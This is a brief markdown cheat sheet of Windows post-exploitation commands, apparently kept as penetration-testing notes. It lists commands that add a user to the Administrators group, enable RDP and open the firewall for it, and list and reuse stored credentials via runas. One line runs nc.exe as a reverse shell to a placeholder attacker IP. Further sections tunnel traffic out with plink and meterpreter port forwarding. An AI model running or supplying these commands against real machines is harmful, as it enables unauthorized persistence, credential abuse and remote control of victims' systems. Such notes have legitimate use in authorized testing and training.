# Useful Commands

### Add user
```
net user <username> <password> /add # Add user
net localgroup administrators <username> /add # Add user to Administrators group
```
### Enable RDP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
Enable RDP rule
```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
Add user to RDP Group
```
net localgroup "Remote Desktop Users" "<username>" /add
```

### Runas
```
cmdkey /list # list stored credentials
runas /savedcred /user:WORKGROUP\Administrator cmd.exe # Use stored credentials
runas /env /noprofile /user:<username> <password> "c:\nc.exe -nc <ATTACKER-IP> <ATTACKER-PORT> -e cmd.exe" # Use with given credentials
```

### Port Forwarding

over SSH with plink.exe
```
upload plink.exe to target machine
run SSH service on atackker machine
plink.exe -l <USERNAME> -pw <PASSWORD> <TARGET-IP> -R <TARGET-PORT>:127.0.0.1:<LOCAL-PORT> # on target machine

For example:
plink.exe -l root -pw password 192.168.1.25 -R 80:127.0.0.1:80
```

with meterpreter
```
portfwd add –l <PORT> –p <PORT> –r <TARGET-IP>
portfwd list # list of currently listening and forwarded ports

option:
-l option is the local port that will be listening and forwarded to our target
-p option is the destination port on our targeting host
```
